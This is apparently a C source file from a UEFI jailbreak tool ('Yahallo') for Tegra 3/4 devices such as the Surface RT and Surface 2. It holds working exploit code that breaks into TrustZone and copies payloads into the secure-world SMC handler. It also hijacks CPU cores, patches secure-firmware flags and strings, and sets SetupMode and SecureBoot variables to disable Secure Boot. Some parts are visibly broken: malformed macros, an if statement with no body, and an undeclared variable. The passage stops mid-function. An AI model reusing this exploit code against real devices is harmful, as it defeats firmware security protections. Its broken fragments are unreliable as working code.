// Exploit.c: Device specific exploit code
#include "Include/Application.h"
#include "Include/Devices.h"
#include <Library/MemoryAllocationLib.h>


#define DUMP_SIZE 0x2000000
CHAR8 g_FirmwareDumpBuffer[DUMP_SIZE + 1] = {0};

EFI_STATUS loadPayloadIntoMemory(EFI_PHYSICAL_ADDRESS memoryAddress, short unsigned int fileName[], size_t* fileSize);

void memcpy_usr(void* dest, const void* src, size_t n) {
	char *src_char = (char *)src;
	char *dest_char = (char *)dest;
	for (int i=0; i<n; i++) {
		dest_char[i] = src_char[i]; //copy contents byte by byte
	}
}

// adopted from kernel code. thanks Leander :)
struct parking_protocol_mailbox {
	uint32_t cpu_id;
	uint32_t reserved;
	uint64_t entry_point; // keep at 64Bit to keep cpu_mailbox_entry aligned
};

struct cpu_mailbox_entry {
	struct parking_protocol_mailbox *mailbox;
	uint32_t mailbox_addr;
	uint8_t version;
	uint8_t gic_cpu_id;
};

static struct cpu_mailbox_entry cpu_mailbox_entries[4];

static void acpi_parking_protocol_cpu_init(void)
{
	cpu_mailbox_entries[0].gic_cpu_id = 0;
	cpu_mailbox_entries[0].version = 1;
	cpu_mailbox_entries[0].mailbox_addr = 0x82001000;
	cpu_mailbox_entries[0].mailbox = (struct parking_protocol_mailbox*)(0x82001000U);

	cpu_mailbox_entries[1].gic_cpu_id = 1;
	cpu_mailbox_entries[1].version = 1;
	cpu_mailbox_entries[1].mailbox_addr = 0x82002000;
	cpu_mailbox_entries[1].mailbox = (struct parking_protocol_mailbox*)(0x82002000U);

	cpu_mailbox_entries[2].gic_cpu_id = 2;
	cpu_mailbox_entries[2].version = 1;
	cpu_mailbox_entries[2].mailbox_addr = 0x82003000;
	cpu_mailbox_entries[2].mailbox = (struct parking_protocol_mailbox*)(0x82003000U);

	cpu_mailbox_entries[3].gic_cpu_id = 3;
	cpu_mailbox_entries[3].version = 1;
	cpu_mailbox_entries[3].mailbox_addr = 0x82004000;
	cpu_mailbox_entries[3].mailbox = (struct parking_protocol_mailbox*)(0x82004000U);
}


#define _MEM(addr) *(volatile uint32_t *)(addr)
#define mem_read(addr) _MEM(addr)
#define mem_write(addr, value) _MEM(addr) = value
#define mem_clear(base, value) _R_MEMEG(addr) &= ~value
#define mem_set(base, value) _RE_MEMG(addr) |= value


void start_secondary_core(int cpu) {
	acpi_parking_protocol_cpu_init();


	uint32_t cpu_id = *((uint32_t*)0x82002000U); 
	
	if (cpu_id != ~0U) {
		Print(L"something wrong\r\n");
	}

	// Let the secondary core use the payload loaded by UEFI.
	
	mem_write((uint32_t)(&cpu_mailbox_entries[cpu].mailbox->entry_point), 0x83800000U);
	ArmDataMemoryBarrier();
  	ArmDataSynchronizationBarrier();
	mem_write((uint32_t)(&cpu_mailbox_entries[cpu].mailbox->cpu_id), cpu);
  	ArmDataMemoryBarrier();
  	ArmDataSynchronizationBarrier();
	
	// Interrupt magic.
	// interrupt according to ACPI PP 0x00fe0000
	// reg: 0xf00
	// base: 0x50041000

	mem_write(0x50041f00U, 0x00fe0000U);
	//mem_write(0x50041f00U, 0x00fe0000U);
	//mem_write(0x50041f00U, 0x00fe0000U);

}

void DisplayCommonBanner()
{
  Print(L"\nYahallo - Tegra 3/4 Secure Boot Unlock Utility\n");
  Print(L"Be aware that this process can take a few minutes\n");
}

void SurfaceRTExploit()
{
TEGRA3_OFFSET_INFO fwInfo = {
      0x5020, 0x5018, 0x24780, 0x24754, 0x294, 0x2a8,
  };
  tegra3exploit(&fwInfo);
}

void Yoga_11_Exploit()
{
TEGRA3_OFFSET_INFO fwInfo = {
      0x5020, 0x5018, 0x24780, 0x24754, 0x294, 0x2a8,
  };
  tegra3exploit(&fwInfo);
}
void VivoTab_Exploit()
{
TEGRA3_OFFSET_INFO fwInfo = {
      0x5020, 0x5018, 0x24780, 0x24754, 0x294, 0x2a8,
  };
  tegra3exploit(&fwInfo);
}


void Surface2_Fw_2_06_500_Exploit()
{
	
//2.6.500 runtime flag1: 811A4678 - offset 0x26910 
//2.6.500 runtime flag2: 811A464C - offset 0x268E4 
//2.6.500 pTzGetHashStateString: 8117DD68
//2.6.500 UefiSecureWorldSetupModeString:0x8117E26C - offset 0x504
//2.6.500 UefiSecureWorldSecureBootString: 0x8117E280 - offset 0x518
	
  SURFACE2_FW_OFFSET_INFO fwInfo = {
      0x54A4, 0x549C, 0x26910, 0x268E4, 0x504, 0x518,
  };
  Surface2Exploit(&fwInfo);
}

void Surface2_Fw_4_22_500_Exploit()
{
  // SetVariableAddress = Base + 0xb54
  // gSharedMemoryStart = Base + 0x5ff8
  // gSharedMemoryEnd = Base + 0x5ff0
  // GetHashState = Base + 0x97c2c
  // RuntimeMode flag 1: Base+0xbe510
  // RuntimeMode flag 2: Base+0xbe4e4
  // SecureBoot / SetupMode strings:
  // String is located at Base+0x9811c, delta = 0x4F0
  // String is located at Base+0x98130, delta = 0x504
  SURFACE2_FW_OFFSET_INFO fwInfo = {
      0x54A4, 0x549C, 0x268E4, 0x268B8, 0x4F0, 0x504,
  };
  Surface2Exploit(&fwInfo);
}

void Surface2Exploit(PSURFACE2_FW_OFFSET_INFO pFwInfo)
{
  EFI_STATUS Status = EFI_SUCCESS;

  DisplayCommonBanner();
  Print(L"\nElevator for Surface 2\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvTegra4Exploit();
  Print(L"Hmmmmmm.\n");

	/////////////////////////////////////////////	
/*
	  // Dump the firmware from 0x80000000 to 0x82000000
  Print(L"Proceed to dump the firmware!\n");
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();
  CopyMem(g_FirmwareDumpBuffer, (VOID *)0x80000000, DUMP_SIZE); 
  //CopyMem(g_FirmwareDumpBuffer, (VOID *)0xFF4E5B54, DUMP_SIZE); //2.6.500 SETVAR ADDRESS
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Dump finalized. Save to memory...\n");

  // Save this to file
  EFI_HANDLE *fsHandles     = NULL;
  UINTN       fsHandleCount = 0;

  Status = gBS->LocateHandleBuffer(
      ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &fsHandleCount,
      &fsHandles);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to get EFI Simple Filesystem Protocol Buffer: %r\n", Status);
    goto exit;
  }

  for (UINTN i = 0; i < fsHandleCount; i++) {
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *fsProtocol      = NULL;
    EFI_FILE_PROTOCOL *              rootDirProtocol = NULL;
    EFI_FILE_PROTOCOL *              fileProtocol    = NULL;
    UINTN                            bufferSize = sizeof(g_FirmwareDumpBuffer);

    Status = gBS->HandleProtocol(
        fsHandles[i], &gEfiSimpleFileSystemProtocolGuid, (VOID **)&fsProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to get EFI Simple Filesystem Protocol: %r\n", Status);
      continue;
    }

    Status = fsProtocol->OpenVolume(fsProtocol, &rootDirProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open directory: %r\n", Status);
      continue;
    }

    Status = rootDirProtocol->Open(
        rootDirProtocol, &fileProtocol, L"tzmemdump.bin",
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open file: %r\n", Status);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->SetPosition(fileProtocol, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to set position of file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status =
        fileProtocol->Write(fileProtocol, &bufferSize, g_FirmwareDumpBuffer);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to write file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->Flush(fileProtocol);
    fileProtocol->Close(fileProtocol);
    rootDirProtocol->Close(rootDirProtocol);
  }
	
	 Print(L"Saved to memory.\n");
	while(1);
	////////////////////////////
	
*/
	
/////////////////////UEFI U-BOOT LOADING//////////////////////////	
	size_t fileSizeramdisk = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x89000000, L"\\ramdisk.img", &fileSizeramdisk);

	size_t fileSizerecramdisk = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x92000000, L"\\recovery-ramdisk.img", &fileSizerecramdisk);
  	
	// Load primary core exploit payload into memory
	Print(L"Loading exploit payload into memory!\n");
	size_t fileSizeprimary = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x83000000, L"\\core0_payload.bin", &fileSizeprimary);
	if (Status != EFI_SUCCESS)
	{
		Print(L"\tFailed at loading payload!\n");

		FinalizeApp();
	}
	Print(L"\tPayload is now in memory!\n");
	// Load secondary core exploit payload into memory
        size_t fileSizecore1 = 0;
        Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x83100000, L"\\core1_payload.bin", &fileSizecore1);

	//size_t fileSizecore2 = 0;
        //Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x83100000, L"\\core2_payload.bin", &fileSizecore2);

	//size_t fileSizecore3 = 0;
        //Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x83100000, L"\\core3_payload.bin", &fileSizecore3);
	
	
	// Load secondary core smc trigger
	size_t fileSizesmc = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x83800000, L"\\secondary_smc.bin", &fileSizesmc);
	if (Status != EFI_SUCCESS)
	
	// Put uboot into memory
	Print(L"Loading u-boot into memory!\n");

	size_t fileSizeuboot = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x84000000, L"\\u-boot-dtb-s2.bin", &fileSizeuboot);
	if (Status != EFI_SUCCESS)
	{
		Print(L"\tFailed at loading u-boot!\n");

		FinalizeApp();
	}
	Print(L"\tU-boot is now in memory!\n");  
    
   ///////////////////////////////////////////////////////////////////////
 
	
	
  
  // TrustZone memory is not mapped in normal world.
  // Since I am lazy to modify PT, I decided to just turn off MMU
  // and turn it back on later.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  UINT32 Something = *((UINT32 *)((VOID *)0x80000000));

////////////////////UEFI U-BOOT LOADING//////////////////////////	
	

  // Copy payload into Trustzone memory.
	// 0x80112174 is in the SMC handler, right after the Synchronization barriers
	// The memory needs to be marked as secure, as you can only execute secure memory in secure mode so
	// we copy the payload to TZ memory
	
	//surface 1 address is 0x80112174
	//surface 2 address is 0x80119F74 (4.22.500 UEFI)
	//surface 2 address is 0x801167F4 (2.06.500 UEFI)
	//vivotab address is 0x80111AD4
	//yoga address is 0x80111AF4

	//memcpy_usr((void*)(0x80112174), (const void*)0x83000000, (size_t)fileSize1);
	//memcpy_usr((void*)(0x80119F74), (const void*)0x83000000, (size_t)fileSize1);
	//memcpy_usr((void*)(0x80111AF4), (const void*)0x83000000, (size_t)fileSize1);
	//memcpy_usr((void*)(0x80111AD4), (const void*)0x83000000, (size_t)fileSize1);
	memcpy_usr((void*)(0x80119F74), (const void*)0x83000000, (size_t)fileSize1);
	mem_write(0x82002880U, 0x83100000U); // set core 1 smc handler address to payload
	//mem_write(0x82003880U, 0x83200000U); // set core 2 smc handler address to payload
	//mem_write(0x82004880U, 0x83300000U); // set core 3 smc handler address to payload
///////////////////////////////////////////////////////////////////////
	
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Something at 0x80000000 with exploit: 0x%x\n", Something);
  // If memory access succeeded, we should read something not just FFFFFFF
  if (Something == 0xFFFFFFFF) {
    Print(L"Something happened and the exploit doesn't work\n");
    Status = EFI_ABORTED;
    goto exit;
  }

start_secondary_core(1);
/*
	
/////////////////////UEFI U-BOOT LOADING//////////////////////////

  // EXIT BOOT SERVICES
  
	UINTN MemMapSize = 0;
	EFI_MEMORY_DESCRIPTOR* MemMap = 0;
	UINTN MapKey = 0;
	UINTN DesSize = 0;
	UINT32 DesVersion = 0;

	gBS->GetMemoryMap(
                &MemMapSize,
                MemMap,
                &MapKey,
                &DesSize,
                &DesVersion
        );


        Status = gBS->ExitBootServices(
              ImageHandle,
                MapKey
        );

        if (EFI_ERROR(Status))
        {
                Print(L"Failed to exit BS\n");
       }
*/
	
	// This should trigger an SMC, jump to the payload and output stuff to uart. Hopefully.
	ArmCallSmcHelper(0, 0, 0, 0);
  
Print(L"Something happened and the smc jump to the payload failed\n");
	
	while(1);
  
///////////////////////////////////////////////////////////////////////

	
  //////////////////////////////////
  //      ORIGINAL CODE BELOW     //
  //////////////////////////////////
  
  // Check some offset things. The NvVariableDxe.efi program directly
  // registers its variable handler to EFI System Table, so we have a
  // convenient way to determine its memory location.
  //
  // We want to retrieve the original shared buffer address to
  // normally invoke EFI variable services.

  UINTN SetVariableAddress = (UINTN)((VOID *)gRT->SetVariable);

  UINTN SharedMemoryStartAddressPointerAddress =
      SetVariableAddress + pFwInfo->UefiNsWorldBufferStartOffset;
  UINTN SharedMemoryEndAddressPointerAddress =
      SetVariableAddress + pFwInfo->UefiNsWorldBufferEndOffset;

  UINTN SharedMemoryStartAddress =
      *((UINTN *)SharedMemoryStartAddressPointerAddress);
  UINTN SharedMemoryEndAddress =
      *((UINTN *)SharedMemoryEndAddressPointerAddress);

  // Check if the value makes sense or not
  Print(L"Set Variable Address = %p\n", SetVariableAddress);
  Print(L"Shared Memory Start = %p\n", SharedMemoryStartAddress);
  Print(L"Shared Memory End = %p\n", SharedMemoryEndAddress);
  if (SharedMemoryEndAddress != SharedMemoryStartAddress + 0x12004) {
    Print(L"Shared memory area sanity check failed: size mismatch (wrong "
          L"data?)\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  Print(L"Performing some search in the TZ memory region...\n");
  Print(
      L"This is usually quick. In worst case, it might lasts a few minutes.\n");
  Print(L"Please reset your device and retry if no progress is made in 15 "
        L"minutes.\n");

  // Where is TrustZone binary?
  // Turn off MMU before proceeding for the same reason.
  // There's no good way to determine its actual location assuming it might
  // change, But since we know GetHashState string only appears in TZ binary, we
  // just brute force search the memory for the result.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  const char GetHashStateString[] = "GetHashState";
  // This might not has to search 0x80000000 to 0x83000000, can be smaller
  void *pTzGetHashStateString = memmem(
      (void *)0x80000000, 0x2000000, GetHashStateString,
      sizeof(GetHashStateString));
  volatile char *pRuntimeFlag1;
  volatile char *pRuntimeFlag2;
  char           runtimeFlag1 = 0, runtimeFlag2 = 0, valid = 0;
  // GetHashState = Base + 0x97c2c
  // RuntimeMode flag 1: Base+0xbe510 (clear buffer and register buffer again
  // with handler) RuntimeMode flag 2: Base+0xbe4e4 (variable checks that so
  // secure variable cannot be written) Clear these two flags to 0 to allow
  // register buffer again
  if (pTzGetHashStateString != NULL) {
    pRuntimeFlag1 =
        ((volatile char *)pTzGetHashStateString +
         pFwInfo->UefiSecureWorldRuntimeFlag1Offset);
    pRuntimeFlag2 =
        ((volatile char *)pTzGetHashStateString +
         pFwInfo->UefiSecureWorldRuntimeFlag2Offset);

    runtimeFlag1 = *pRuntimeFlag1;
    runtimeFlag2 = *pRuntimeFlag2;
    valid        = 1;
  }

  ArmEnableDataCache();
  ArmEnableInstructionCache();
  ArmEnableMmu();

  if (valid) {
    Print(
        L"Runtime Flag 1 = %d, Runtime Flag 2 = %d\n", runtimeFlag1,
        runtimeFlag2);
    Print(L"GetHashState string address = %p\n", pTzGetHashStateString);
    // They are supposed to be 1
    if (runtimeFlag1 != 1 || runtimeFlag2 != 1) {
      Print(L"Unexpected Runtime Flag value\n");
      goto exit;
    }
  }
  else {
    Print(L"Pattern not found. Hmm.\n");
    Status = EFI_NOT_FOUND;
    goto exit;
  }

RuntimePhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *(volatile UINT32 *)pRuntimeFlag1 = 0;
  *(volatile UINT32 *)pRuntimeFlag2 = 0;

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-trigger runtime mode switch, which clears the old registration
  UINT32 Ret = 0;
  Ret        = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- runtime mode patch phase 1\n");
    goto RuntimePhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - runtime mode patch phase "
          L"1\n");
    goto exit;
  }

PatchStringPhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 2
  // Patch string, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  // String is located at 
  volatile char *pSetupModeString =
      ((volatile char *)pTzGetHashStateString +
       pFwInfo->UefiSecureWorldSetupModeStringOffset);
  // String is located at Base+0x98130, delta = 0x504
  volatile char *pSecureBootString =
      ((volatile char *)pTzGetHashStateString +
       pFwInfo->UefiSecureWorldSecureBootStringOffset);
  // BetupMode, BecureBoot
  *pSetupModeString  = 'B';
  *pSecureBootString = 'B';

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-register shared memory buffer area
  // To let variable services pick it up again
  Ret = ArmCallSmcHelper(0x03, 0x06, (UINT32)SharedMemoryStartAddress, 0x24008);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- shared memory address registration\n");
    goto PatchStringPhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - shared memory address "
          L"registration\n");
    goto exit;
  }

  // Ready to patch the variable
  Print(L"Thinking....\n");
  UINT8 Data = 1;
  // SecureMode = 1 to disarm all security checks
  Status = gRT->SetVariable(
      L"SetupMode", &gEfiGlobalVariableGuid,
      EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
          EFI_VARIABLE_NON_VOLATILE,
      sizeof(UINT8), &Data);
  if (!EFI_ERROR(Status)) {
    Data = 0;
    // SecureBoot = 0 to explicitly disable Secure Boot
    Status = gRT->SetVariable(
        L"SecureBoot", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_NON_VOLATILE,
        sizeof(UINT8), &Data);
    if (!EFI_ERROR(Status)) {
      Print(L"Have fun\n");
      UINTN VarSize = sizeof(UINT8);
      Status        = gRT->GetVariable(
          L"SetupMode", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SetupMode = 0x%x\n", Data);
      }

      Status = gRT->GetVariable(
          L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SecureBoot = 0x%x\n", Data);
      }
    }
    else {
      Print(L"Something happened: 0x%x (setting SecureBoot)\n", Status);
    }
  }
  else {
    Print(L"Something happened: 0x%x (setting SetupMode)\n", Status);
  }

exit:
  FinalizeApp();
}

///////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////

void tegra3exploit(PTEGRA3_OFFSET_INFO pFwInfo)
{
  EFI_STATUS Status = EFI_SUCCESS;

  DisplayCommonBanner();
  Print(L"\nElevator for TEGRA3\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvTegra3Exploit();
  Print(L"Hmmmmmm.\n");

	/////////////////////////////////////////////	
/*
	  // Dump the firmware from 0x80000000 to 0x82000000
  Print(L"Proceed to dump the firmware!\n");
  ArmDisableCachesAndMmu();
  //ArmInvalidateTlb();
  //ArmInvalidateDataCache();
  //ArmInvalidateInstructionCache();
  CopyMem(g_FirmwareDumpBuffer, (VOID *)0x80000000, DUMP_SIZE); 
  //CopyMem(g_FirmwareDumpBuffer, (VOID *)0xFF4E5B54, DUMP_SIZE); //2.6.500 SETVAR ADDRESS
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Dump finalized. Save to memory...\n");

  // Save this to file
  EFI_HANDLE *fsHandles     = NULL;
  UINTN       fsHandleCount = 0;

  Status = gBS->LocateHandleBuffer(
      ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &fsHandleCount,
      &fsHandles);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to get EFI Simple Filesystem Protocol Buffer: %r\n", Status);
    goto exit;
  }

  for (UINTN i = 0; i < fsHandleCount; i++) {
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *fsProtocol      = NULL;
    EFI_FILE_PROTOCOL *              rootDirProtocol = NULL;
    EFI_FILE_PROTOCOL *              fileProtocol    = NULL;
    UINTN                            bufferSize = sizeof(g_FirmwareDumpBuffer);

    Status = gBS->HandleProtocol(
        fsHandles[i], &gEfiSimpleFileSystemProtocolGuid, (VOID **)&fsProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to get EFI Simple Filesystem Protocol: %r\n", Status);
      continue;
    }

    Status = fsProtocol->OpenVolume(fsProtocol, &rootDirProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open directory: %r\n", Status);
      continue;
    }

    Status = rootDirProtocol->Open(
        rootDirProtocol, &fileProtocol, L"tzmemdump.bin",
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open file: %r\n", Status);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->SetPosition(fileProtocol, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to set position of file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status =
        fileProtocol->Write(fileProtocol, &bufferSize, g_FirmwareDumpBuffer);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to write file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->Flush(fileProtocol);
    fileProtocol->Close(fileProtocol);
    rootDirProtocol->Close(rootDirProtocol);
  }
	
	 Print(L"Saved to memory.\n");
	while(1);
	////////////////////////////
*/	

	
/////////////////////UEFI U-BOOT LOADING//////////////////////////	
	
  	Print(L"Loading exploit payload into memory!\n");
	size_t fileSize1 = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x83000000, L"\\payload.bin", &fileSize1);
	if (Status != EFI_SUCCESS)
	{
		Print(L"\tFailed at loading payload!\n");

		FinalizeApp();
	}
	Print(L"\tPayload is now in memory!\n");
	// Put uboot into memory
	Print(L"Loading u-boot into memory!\n");

	size_t fileSize2 = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x84000000, L"\\u-boot-dtb-s2.bin", &fileSize2);
	if (Status != EFI_SUCCESS)
	{
		Print(L"\tFailed at loading u-boot!\n");

		FinalizeApp();
	}
	Print(L"\tU-boot is now in memory!\n");  
    
   ///////////////////////////////////////////////////////////////////////
  
	
	
  
  // TrustZone memory is not mapped in normal world.
  // Since I am lazy to modify PT, I decided to just turn off MMU
  // and turn it back on later.
  ArmDisableCachesAndMmu();
  //ArmInvalidateTlb();
  //ArmInvalidateDataCache();
  //ArmInvalidateInstructionCache();

  UINT32 Something = *((UINT32 *)((VOID *)0x80000000));

////////////////////UEFI U-BOOT LOADING//////////////////////////	
	

  // Copy payload into Trustzone memory.
	// 0x80112174 is in the SMC handler, right after the Synchronization barriers
	// The memory needs to be marked as secure, as you can only execute secure memory in secure mode so
	// we copy the payload to TZ memory
	
	//surface 1 address is 0x80112174
	//surface 2 address is 0x80119F74 (4.22.500 UEFI)
	//surface 2 address is 0x801167F4 (2.06.500 UEFI)

	memcpy_usr((void*)(0x80112174), (const void*)0x83000000, (size_t)fileSize1);
	//memcpy_usr((void*)(0x80119F74), (const void*)0x83000000, (size_t)fileSize1);
	//memcpy_usr((void*)(0x801167F4), (const void*)0x83000000, (size_t)fileSize1);
	
///////////////////////////////////////////////////////////////////////
	
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Something at 0x80000000 with exploit: 0x%x\n", Something);
  // If memory access succeeded, we should read something not just FFFFFFF
  if (Something == 0xFFFFFFFF) {
    Print(L"Something happened and the exploit doesn't work\n");
    Status = EFI_ABORTED;
    goto exit;
  }
	
/////////////////////UEFI U-BOOT LOADING//////////////////////////

  // EXIT BOOT SERVICES
  
	UINTN MemMapSize = 0;
	EFI_MEMORY_DESCRIPTOR* MemMap = 0;
	UINTN MapKey = 0;
	UINTN DesSize = 0;
	UINT32 DesVersion = 0;

	gBS->GetMemoryMap(
                &MemMapSize,
                MemMap,
                &MapKey,
                &DesSize,
                &DesVersion
        );


        Status = gBS->ExitBootServices(
              ImageHandle,
                MapKey
        );

        if (EFI_ERROR(Status))
        {
                Print(L"Failed to exit BS\n");
       }
  
	// This should trigger an SMC, jump to the payload and output stuff to uart. Hopefully.
	ArmCallSmcHelper(0, 0, 0, 0);
  
Print(L"Something happened and the smc jump to the payload failed\n");
	
	while(1);
  
///////////////////////////////////////////////////////////////////////
 
	
  //////////////////////////////////
  //      ORIGINAL CODE BELOW     //
  //////////////////////////////////
  
  // Check some offset things. The NvVariableDxe.efi program directly
  // registers its variable handler to EFI System Table, so we have a
  // convenient way to determine its memory location.
  //
  // We want to retrieve the original shared buffer address to
  // normally invoke EFI variable services.

  UINTN SetVariableAddress = (UINTN)((VOID *)gRT->SetVariable);

  UINTN SharedMemoryStartAddressPointerAddress =
      SetVariableAddress + pFwInfo->UefiNsWorldBufferStartOffset;
  UINTN SharedMemoryEndAddressPointerAddress =
      SetVariableAddress + pFwInfo->UefiNsWorldBufferEndOffset;

  UINTN SharedMemoryStartAddress =
      *((UINTN *)SharedMemoryStartAddressPointerAddress);
  UINTN SharedMemoryEndAddress =
      *((UINTN *)SharedMemoryEndAddressPointerAddress);

  // Check if the value makes sense or not
  Print(L"Set Variable Address = %p\n", SetVariableAddress);
  Print(L"Shared Memory Start = %p\n", SharedMemoryStartAddress);
  Print(L"Shared Memory End = %p\n", SharedMemoryEndAddress);
  if (SharedMemoryEndAddress != SharedMemoryStartAddress + 0x12004) {
    Print(L"Shared memory area sanity check failed: size mismatch (wrong "
          L"data?)\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  Print(L"Performing some search in the TZ memory region...\n");
  Print(
      L"This is usually quick. In worst case, it might lasts a few minutes.\n");
  Print(L"Please reset your device and retry if no progress is made in 15 "
        L"minutes.\n");

  // Where is TrustZone binary?
  // Turn off MMU before proceeding for the same reason.
  // There's no good way to determine its actual location assuming it might
  // change, But since we know GetHashState string only appears in TZ binary, we
  // just brute force search the memory for the result.
  ArmDisableCachesAndMmu();
  //ArmInvalidateTlb();
  //ArmInvalidateDataCache();
 // ArmInvalidateInstructionCache();

  const char GetHashStateString[] = "GetHashState";
  // This might not has to search 0x80000000 to 0x83000000, can be smaller
  void *pTzGetHashStateString = memmem(
      (void *)0x80000000, 0x2000000, GetHashStateString,
      sizeof(GetHashStateString));
  volatile char *pRuntimeFlag1;
  volatile char *pRuntimeFlag2;
  char           runtimeFlag1 = 0, runtimeFlag2 = 0, valid = 0;
  // GetHashState = Base + 0x97c2c
  // RuntimeMode flag 1: Base+0xbe510 (clear buffer and register buffer again
  // with handler) RuntimeMode flag 2: Base+0xbe4e4 (variable checks that so
  // secure variable cannot be written) Clear these two flags to 0 to allow
  // register buffer again
  if (pTzGetHashStateString != NULL) {
    pRuntimeFlag1 =
        ((volatile char *)pTzGetHashStateString +
         pFwInfo->UefiSecureWorldRuntimeFlag1Offset);
    pRuntimeFlag2 =
        ((volatile char *)pTzGetHashStateString +
         pFwInfo->UefiSecureWorldRuntimeFlag2Offset);

    runtimeFlag1 = *pRuntimeFlag1;
    runtimeFlag2 = *pRuntimeFlag2;
    valid        = 1;
  }

  ArmEnableDataCache();
  ArmEnableInstructionCache();
  ArmEnableMmu();

  if (valid) {
    Print(
        L"Runtime Flag 1 = %d, Runtime Flag 2 = %d\n", runtimeFlag1,
        runtimeFlag2);
    Print(L"GetHashState string address = %p\n", pTzGetHashStateString);
    // They are supposed to be 1
    if (runtimeFlag1 != 1 || runtimeFlag2 != 1) {
      Print(L"Unexpected Runtime Flag value\n");
      goto exit;
    }
  }
  else {
    Print(L"Pattern not found. Hmm.\n");
